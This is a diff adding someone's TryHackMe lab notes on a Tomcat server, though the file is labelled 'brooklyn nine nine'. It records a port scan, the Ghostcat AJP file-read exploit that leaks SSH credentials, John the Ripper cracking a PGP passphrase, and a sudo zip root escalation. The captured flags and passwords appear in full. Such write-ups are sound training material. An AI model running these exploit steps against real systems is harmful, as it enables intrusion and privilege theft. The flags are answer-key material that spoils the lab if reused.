@@ -1,0 +1,143 @@
+THM - brooklyn nine nine - 18 Oct 2022
+
+10.10.23.124
+
+---------------------
+users
+
+
+
+creds:
+skyfuck:8730281lkjlkjdqlksalks
+
+flags:
+
+THM{GhostCat_1s_so_cr4sy}	user.txt
+	root.txt
+--------------------------------------
+
+
+PORT     STATE SERVICE
+22/tcp   open  ssh
+53/tcp   open  domain
+8009/tcp open  ajp13
+8080/tcp open  http-proxy
+
+PORT     STATE SERVICE    VERSION
+22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 f3:c8:9f:0b:6a:c5:fe:95:54:0b:e9:e3:ba:93:db:7c (RSA)
+|   256 dd:1a:09:f5:99:63:a3:43:0d:2d:90:d8:e3:e1:1f:b9 (ECDSA)
+|_  256 48:d1:30:1b:38:6c:c6:53:ea:30:81:80:5d:0c:f1:05 (EdDSA)
+53/tcp   open  tcpwrapped
+8009/tcp open  ajp13      Apache Jserv (Protocol v1.3)
+| ajp-methods: 
+|_  Supported methods: GET HEAD POST OPTIONS
+8080/tcp open  http       Apache Tomcat 9.0.30
+|_http-favicon: Apache Tomcat
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-title: Apache Tomcat/9.0.30
+MAC Address: 02:0C:40:99:C2:4D (Unknown)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+port 8009
+https://book.hacktricks.xyz/network-services-pentesting/8009-pentesting-apache-jserv-protocol-ajp
+**Apache 9.0.30 vulnerable
+
+
+CVE-2020-1938 
+
+ Exploit Title                                                                 |  Path
+------------------------------------------------------------------------------- ---------------------------------
+Apache Tomcat - AJP 'Ghostcat File Read/Inclusion                              | multiple/webapps/48143.py
+------------------------------------------------------------------------------- ------------------------------
+>python2 48143.py $IP
+
+  version="4.0"
+  metadata-complete="true">
+
+  <display-name>Welcome to Tomcat</display-name>
+  <description>
+     Welcome to GhostCat
+	skyfuck:8730281lkjlkjdqlksalks
+  </description>
+
+</web-app>
+
+ssh ** with above creds
+
+skyfuck@ubuntu:~$ whoami
+skyfuck
+skyfuck@ubuntu:~$ id
+uid=1002(skyfuck) gid=1002(skyfuck) groups=1002(skyfuck)
+
+skyfuck@ubuntu:/home/merlin$ cat user.txt 
+THM{GhostCat_1s_so_cr4sy}
+
+tryhackme.asc
+credentials.pgp
+
+https://superuser.com/questions/1196165/pgp-file-decryption-from-linux-cmd-line
+
+the .asc requires a password
+
+transfer the file to the kali machine
+gpg2john
+crack the hash with john
+
+root@ip-10-10-66-85:~# john --wordlist=Tools/wordlists/rockyou.txt crackme 
+Warning: detected hash type "gpg", but the string is also recognized as "gpg-opencl"
+Use the "--format=gpg-opencl" option to force loading these as that type instead
+Using default input encoding: UTF-8
+Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
+Cost 1 (s2k-count) is 65536 for all loaded hashes
+Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
+Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashes
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+alexandru        (tryhackme)
+1g 0:00:00:00 DONE (2022-10-18 19:55) 7.692g/s 8246p/s 8246c/s 8246C/s chinita..alexandru
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+
+
+skyfuck@ubuntu:~$ gpg -d credential.pgp 
+
+You need a passphrase to unlock the secret key for
+user: "tryhackme <stuxnet@tryhackme.com>"
+1024-bit ELG-E key, ID 6184FBCC, created 2020-03-11 (main key ID C6707170)
+
+gpg: gpg-agent is not available in this session
+gpg: WARNING: cipher algorithm CAST5 not found in recipient preferences
+gpg: encrypted with 1024-bit ELG-E key, ID 6184FBCC, created 2020-03-11
+      "tryhackme <stuxnet@tryhackme.com>"
+merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j 
+
+su merlin
+
+merlin@ubuntu:/home/skyfuck$ whoami
+merlin
+merlin@ubuntu:/home/skyfuck$ id
+uid=1000(merlin) gid=1000(merlin) groups=1000(merlin),4(adm),24(cdrom),30(dip),46(plugdev),114(lpadmin),115(sambashare)
+
+merlin@ubuntu:/home/skyfuck$ sudo -l
+Matching Defaults entries for merlin on ubuntu:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User merlin may run the following commands on ubuntu:
+    (root : root) NOPASSWD: /usr/bin/zip
+merlin@ubuntu:/home/skyfuck$ TF=$(mktemp -u)
+merlin@ubuntu:/home/skyfuck$ sudo zip $TF /etc/hosts -T -TT 'sh #'
+  adding: etc/hosts (deflated 31%)
+# whoami
+root
+
+# cat root.txt	
+THM{Z1P_1S_FAKE}
+
+https://gtfobins.github.io/gtfobins/zip/#sudo
+
+
